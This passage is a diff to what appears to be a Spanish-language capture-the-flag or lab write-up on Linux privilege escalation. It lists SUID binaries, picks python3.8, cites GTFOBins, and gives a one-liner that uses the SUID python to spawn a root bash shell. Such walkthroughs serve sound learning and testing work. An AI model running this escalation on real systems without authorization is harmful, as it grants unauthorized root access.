@@ -260,4 +260,16 @@ find / -perm -4000 2>/dev/null
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
-entre ellos vemos python
+entre ellos vemos /usr/bin/python3.8
+vamos a nuestra querida página de vulnerabilidades en binarios:
+```bash
+https://gtfobins.github.io/gtfobins/python/#suid
+```
+```
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+lo ajustamos un poco a nuestras necesidades, quedando así:
+```bash
+/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+```
+y ya somos root
